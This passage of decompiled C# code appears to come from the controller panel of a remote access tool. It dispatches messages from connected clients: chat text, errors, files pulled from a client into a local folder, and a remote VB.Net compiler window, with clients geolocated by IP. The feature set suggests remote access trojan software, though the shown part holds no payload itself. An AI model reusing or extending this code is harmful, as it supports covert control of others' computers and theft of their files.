							else if (Operators.CompareString(text, "Wchat", false) == 0)
							{
								bool invokeRequired81 = Messages.F.InvokeRequired;
								if (invokeRequired81)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Chat chat3 = (Chat)MyProject.Application.OpenForms["Chat : " + array[1]];
									bool flag173 = chat3 != null;
									if (flag173)
									{
										Guna2TextBox guna2TextBox;
										(guna2TextBox = chat3.Guna2TextBox2).Text = guna2TextBox.Text + array[2];
										chat3.Guna2TextBox2.SelectionStart = chat3.Guna2TextBox2.Text.Length;
										chat3.Guna2TextBox2.ScrollToCaret();
										chat3.Guna2TextBox2.Refresh();
										try
										{
											MyProject.Computer.Audio.Play(Path.Combine(Application.StartupPath, "Sounds", "Chat.wav"));
										}
										catch (Exception ex17)
										{
											Debug.WriteLine("Wchat: " + ex17.Message);
										}
									}
								}
							}
						}
						else if (Operators.CompareString(text, "InformationsErr", false) == 0)
						{
							bool invokeRequired82 = Messages.F.InvokeRequired;
							if (invokeRequired82)
							{
								Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
								{
									C,
									b
								});
							}
							else
							{
								INFO info3 = (INFO)MyProject.Application.OpenForms["Information : " + array[1]];
								bool flag174 = info3 != null;
								if (flag174)
								{
									info3.ToolStripStatusLabel1.ForeColor = Color.Red;
									info3.ToolStripStatusLabel1.Text = array[2];
								}
							}
						}
					}
					else if (num != 3977980836U)
					{
						if (num != 4086144241U)
						{
							if (num == 4160561894U)
							{
								if (Operators.CompareString(text, "downloadedfile", false) == 0)
								{
									bool invokeRequired83 = Messages.F.InvokeRequired;
									if (invokeRequired83)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										FM fm6 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
										bool flag175 = fm6 != null;
										if (flag175)
										{
											string text17 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1]);
											bool flag176 = array[3].Contains("\\") | array[3].Contains("/") | array[1].Contains("\\") | array[1].Contains("/");
											if (flag176)
											{
												fm6.ToolStripStatusLabel1.ForeColor = Color.Red;
												fm6.ToolStripStatusLabel1.Visible = true;
												fm6.ToolStripStatusLabel1.Text = Path.GetFileName(array[3]) + " Download Blocked!";
											}
											else
											{
												bool flag177 = !Directory.Exists(text17);
												if (flag177)
												{
													Directory.CreateDirectory(text17);
												}
												fm6.ToolStripStatusLabel1.ForeColor = Color.Green;
												fm6.ToolStripStatusLabel1.Visible = true;
												File.WriteAllBytes(text17 + "\\" + array[3], Helper.Decompress(Convert.FromBase64String(array[2])));
												fm6.ToolStripStatusLabel1.Text = array[3] + " Download Completed";
											}
										}
									}
								}
							}
						}
						else if (Operators.CompareString(text, "Error", false) == 0)
						{
							bool invokeRequired84 = Messages.F.InvokeRequired;
							if (invokeRequired84)
							{
								Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
								{
									C,
									b
								});
							}
							else
							{
								Helper.LVLog(C.IP.Split(new char[]
								{
									':'
								})[0] + " " + array[1], Color.Red);
								SettingsHelper.MSGS++;
							}
						}
					}
					else if (Operators.CompareString(text, "Compiler", false) == 0)
					{
						bool invokeRequired85 = Messages.F.InvokeRequired;
						if (invokeRequired85)
						{
							Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
							{
								C,
								b
							});
						}
						else
						{
							VBCode vbcode3 = (VBCode)MyProject.Application.OpenForms["VB.Net Compiler : " + array[1]];
							bool flag178 = vbcode3 != null;
							if (flag178)
							{
								C.isDisconnected();
							}
							else
							{
								bool flag179 = vbcode3 == null;
								if (flag179)
								{
									new VBCode
									{
										C = C,
										Name = "VB.Net Compiler : " + array[1],
										Text = "VB.Net Compiler : " + array[1]
									}.Show();
								}
							}
						}
					}
					IL_837D:;
				}
				catch (Exception ex18)
				{
					Helper.LVLog(ex18.Message, Color.Red);
					SettingsHelper.MSGS++;
				}
			}
		}

		// Token: 0x04000442 RID: 1090
		public static Main F;

		// Token: 0x04000443 RID: 1091
		public static GeoIP GetCountry = new GeoIP(Application.StartupPath + "\\GeoIP.dat");

		// Token: 0x0200018C RID: 396
		// (Invoke) Token: 0x06000D46 RID: 3398
		public delegate void _Read(Client C, byte[] b);
	}
}
